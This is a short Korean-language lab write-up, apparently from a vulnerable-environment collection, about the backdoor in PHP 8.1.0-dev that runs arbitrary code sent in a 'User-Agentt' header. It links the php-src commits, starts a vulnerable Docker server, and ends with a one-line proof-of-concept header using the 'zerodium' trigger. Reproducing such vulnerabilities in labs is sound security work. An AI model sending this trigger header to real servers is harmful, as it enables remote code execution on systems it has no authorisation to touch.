## PHP 8.1.0-dev 사용자 에이전트 백도어
- - -
php 버전 8.1.0-dev인 서버에 백도어가 있는 경우 공격자는 User_Agentt 헤더를 전송하여 임의의 코드를 실행할 수 있습니다.

참조:
1. <https://news-web.php.net/php.internals/113838>
2. <https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d>
3. <https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a>

#### 취약한 환경
- - -
도커로 취약한 버전인 PHP 8.1-dev 서버를 시작합니다.

`docker-compose up -d`

환경이 시작된 후 서비스는 http://your-ip:8080에 실행됩니다.


#### 취약성 재현
- - -
다음 요청을 보내 코드를 실행합니다.

`User-Agentt : zerodiumvar_dump(233*233);`
